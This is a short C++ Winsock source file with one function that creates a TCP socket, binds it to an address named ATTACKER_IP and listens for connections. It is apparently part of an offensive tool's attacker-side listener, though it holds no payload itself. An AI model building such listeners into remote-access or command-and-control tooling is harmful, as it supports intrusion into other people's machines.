#include"main.h"

SOCKET GetTcpSocket(SOCKET& ssock, short port)
{

	SOCKADDR_IN saddr = { 0, };
	int errcode = 0;
	ssock = socket(AF_INET, SOCK_STREAM, 0);
	if (ssock == INVALID_SOCKET)
	{
		SocketError(L"socket Error");
		return INVALID_SOCKET;
	}

	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(port);

	errcode = bind(ssock, (LPSOCKADDR)&saddr, sizeof(saddr));
	if (errcode == SOCKET_ERROR)
	{
		SocketError(L"bind Error");
		return INVALID_SOCKET;

	}
	errcode = listen(ssock, 64);
	if (errcode == SOCKET_ERROR)
	{
		SocketError(L"listen Error");
		return INVALID_SOCKET;
	}

	return ssock;

}